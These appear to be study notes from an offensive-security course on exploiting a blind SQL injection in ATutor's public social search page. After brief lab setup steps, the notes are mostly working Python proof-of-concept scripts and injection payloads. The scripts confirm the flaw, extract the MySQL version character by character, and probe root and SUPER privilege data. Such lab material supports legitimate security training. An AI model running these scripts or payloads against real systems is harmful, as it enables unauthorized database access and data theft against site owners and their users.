##### Setting Up the Environment

MySQL server configuration file located at /etc/mysql/my.cnf and uncomment the following lines under the Logging and Replication section:

```
sudo nano /etc/mysql/my.cnf

[mysqld]
...
general_log_file        = /var/log/mysql/mysql.log
general_log             = 1

```

```
sudo systemctl restart mysql
```

```
sudo tail –f /var/log/mysql/mysql.log
```
Generate PHP error:

Update file /etc/php5/apache2/php.ini

```
display_errors = On

```

```
sudo systemctl restart apache2
```
Looking in source code for this:

```
$_user_location	= 'public';
```

```
grep -rnw /var/www/html/ATutor -e "^.*user_location.*public.*" --color

```

ATutor POC:

```
import sys
import re
import requests
from bs4 import BeautifulSoup

def searchFriends_sqli(ip, inj_str):
    target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    print "Response Headers:"
    print r.headers
    print
    print "Response Content:"
    print s.text
    print
    error = re.search("Invalid argument", s.text)
    if error:
        print "Errors found in response. Possible SQL injection found"
    else:
        print "No errors found"

def main():
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <injection_string>" % sys.argv[0]
        print '(+) eg: %s 192.168.121.103 "aaaa\'" '  % sys.argv[0]
        sys.exit(-1)

    ip                  = sys.argv[1]
    injection_string    = sys.argv[2]

    searchFriends_sqli(ip, injection_string)

if __name__ == "__main__":
    main()

```

Blind SQL Injection

 inject queries that ask a series of YES and NO questions (boolean queries) to the database and construct the sought information based on the answers to those questions. 
 The way the information can be inferred depends on the type of blind injection we are dealing with. Blind SQL injections can be classified as boolean-based or time-based.

In Boolean-based injections an attacker injects a boolean SQL query into the database, which forces the web application to display different content in the rendered web page depending on whether the query evaluates to TRUE or FALSE. In this case the attacker can infer the outcome of the boolean SQL payload by observing the differences in the HTTP response content.

In time-based blind SQL injections our ability to infer any information is even more limited because a vulnerable application does not display any differences in the content based on our injected TRUE/FALSE queries. In such cases, the only way to infer any information is by introducing artificial query execution delays in the injected subqueries via database-native functions that consume time. In the case of MySQL, that would be the sleep() function.

Data Exfiltration

payloads cannot contain any spaces, since they are used as delimiters in the query construction process. this is an ATutor-related constraint and not something inherent to MySQL, we can replace spaces with anything that constitutes a valid space substitute in MySQL syntax.

As it turns out, we can use inline comments in MySQL as a valid space! For example, the following SQL query is, in fact, completely valid in MySQL.

```
> select/**/1;
```

Here are the two dummy subqueries we can use to achieve our goal:
```
AAAA')/**/or/**/(select/**/1)=1%23
```
Listing 36 - The injected payload whereby the query evaluates to "true"

```
AAAA')/**/or/**/(select/**/1)=0%23
```
Listing 37 - The injected payload whereby the query evaluates to "false"

```
SELECT count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA')/**/or/**/(select/**/1)=1
%'  OR second_name LIKE '%AAAA')/**/or/**/(select/**/1)=1#%'  OR last_name LIKE '%AAAA')/**/or/**/(select/**/1)=1#%'  OR login LIKE '%AAAA')/**/or/**/(select/**/1)=1#%');

SELECT count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA')/**/or/**/(select/**/1)=0
%'  OR second_name LIKE '%AAAA')/**/or/**/(select/**/1)=0#%'  OR last_name LIKE '%AAAA')/**/or/**/(select/**/1)=0#%'  OR login LIKE '%AAAA')/**/or/**/(select/**/1)=0#%');

```


```
python poc.py atutor "AAAA')/**/or/**/(select/**/1)=1%23"

python poc.py atutor "AAAA')/**/or/**/(select/**/1)=0%23"
```


```
import requests
import sys

def searchFriends_sqli(ip, inj_str, query_type):
    target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target)
    content_length = int(r.headers['Content-Length'])
    if (query_type==True) and (content_length > 20):
        return True
    elif (query_type==False) and (content_length == 20):
        return True
    else:
        return False

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    false_injection_string = "test')/**/or/**/(select/**/1)=0%23"
    true_injection_string  = "test')/**/or/**/(select/**/1)=1%23"

    if searchFriends_sqli(ip, true_injection_string, True):
        if searchFriends_sqli(ip, false_injection_string, False):
            print("(+) the target is vulnerable!")

if __name__ == "__main__":
    main()

```


MySQL Version Extraction

```
mysql> select/**/version();

select/**/(substring((select/**/version()),1,1))='4';

select/**/(substring((select/**/version()),1,1))='5';

select/**/ascii(substring((select/**/version()),1,1))=52;
select/**/ascii(substring((select/**/version()),1,1))=53;

False Query:
q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=52%23

True Query:
q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=53%23

```


```
import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None    

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    print("(+) Retrieving database version....")

    # 19 is length of the version() string. This can
    # be dynamically stolen from the database as well!
    for i in range(1, 20):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")

if __name__ == "__main__":
    main()

```

Poc4.py

```
import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        #print(target)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        #print (content_length)
        if (content_length > 20):
            return j
    return None    

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    print("(+) Retrieving privilege type....")

    # 19 is length of the version() string. This can
    # be dynamically stolen from the database as well!
    for i in range(1, 20):
        #injection_string = "test')/**/or/**/(ascii(substring((select/**/current_user()),%d,1)))=[CHAR]%%23" % i
        #injection_string = "test')/**/or/**/(ascii(substring((select/**/*/**/from/**/information_schema.user_privileges/**/where/**/grantee/**/like/**/'root'),%d,1)))=[CHAR]%%23" % i
        #injection_string = "test')/**/or/**/(ascii(substring((select/**/super_priv/**/from/**/mysql.user/**/where/**/user/**/=/**/'root'),%d,1)))=[CHAR]%%23" % i
        #injection_string = "test'/**/or/**/(ascii(substring((select/**/privilege_type/**/from/**/information_schema.user_privileges/**/where/**/grantee=\"'root'@'localhost'\"/**/and/**/privilege_type='super'),1,1)))=[CHAR]/**/or/**/1='" % i
        injection_string = "test'/**/or/**/(ascii(substring((select/**/privilege_type/**/from/**/information_schema.user_privileges/**/where/**/grantee=\"'root'@'localhost'\"/**/and/**/privilege_type='super'),%d,1)))=[CHAR]/**/or/**/1='" % i
        #print (injection_string)
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")

if __name__ == "__main__":
    main()



```

